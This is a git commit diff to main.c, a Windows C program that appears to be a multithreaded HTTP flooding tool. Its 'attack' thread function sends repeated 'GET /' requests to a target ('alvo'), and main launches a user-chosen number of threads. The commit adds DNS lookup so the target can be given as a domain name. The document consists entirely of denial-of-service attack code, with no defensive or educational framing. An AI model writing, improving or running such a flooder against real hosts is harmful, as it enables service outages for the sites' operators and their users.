6cef41df04b4f06b58cd10ab1298fa29c3574c9c
jamirnasci <jamirnasci@gmail.com>
2022-12-13 23:24:54 -0300

    Using DNS

--- main.c
+++ main.c
@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <pthread.h>
 #include <time.h>
 
@@ -8,15 +9,15 @@
 
 pthread_t threads[MAXTH];
 
-typedef struct alvo PARAMS;
 typedef struct sockaddr SADDR;
 
 struct alvo
 {
-	char *ip;
+	char *dom;
 	char *host;
 	int porta;
 };
+typedef struct alvo PARAMS;
 
 void *attack(void *arg)
 {
@@ -26,14 +27,14 @@ void *attack(void *arg)
 	PARAMS *av1 = (struct alvo *) arg;
 
 	char *host = (char *) av1->host;
-	char *ip = (char *) av1->ip;
+	char *dom = (char *) av1->dom;
 	int porta = (int) av1->porta;
 
 	char req[200];
-	sprintf(req, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", host);
+	sprintf(req, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", dom);
 	struct sockaddr_in alvo;
 
-	alvo.sin_addr.s_addr = inet_addr(ip);
+	alvo.sin_addr.s_addr = inet_addr(host);
 	alvo.sin_family = AF_INET;
 	alvo.sin_port = htons(porta);
 
@@ -60,20 +61,34 @@ void *attack(void *arg)
 
 int main(int argc, char *argv[])
 {
-	int i, j;
+	WSADATA ws;
+	WSAStartup(MAKEWORD(2, 2), &ws);
+
+	int i;
+	int k = 0;
 
 	PARAMS av;
+	struct hostent *h;
+	struct in_addr addr;
 
-	av.ip = argv[1];
-	av.host = argv[2];
-	av.porta = atoi(argv[3]);
-	int tN = atoi(argv[4]);
+	h = gethostbyname(argv[1]);
+	puts(h->h_name);
+	
+	while(h->h_addr_list[k] != 0){
+		addr.s_addr = *(unsigned long *) h->h_addr_list[k++];
+	}
+	puts(inet_ntoa(addr));
+	av.host = inet_ntoa(addr);
+	av.dom = h->h_name;
+	av.porta = atoi(argv[2]);
+	
+	int tN = atoi(argv[3]);
 
 	for (i = 0; i < tN; i++)
 	{
 		pthread_create(&(threads[i]), NULL, attack, &av);
 		printf("Threads %d\n", i);
-		system("cls");
+		Sleep(10);
 	}
 	
 	for (i = 0; i < tN; i++)
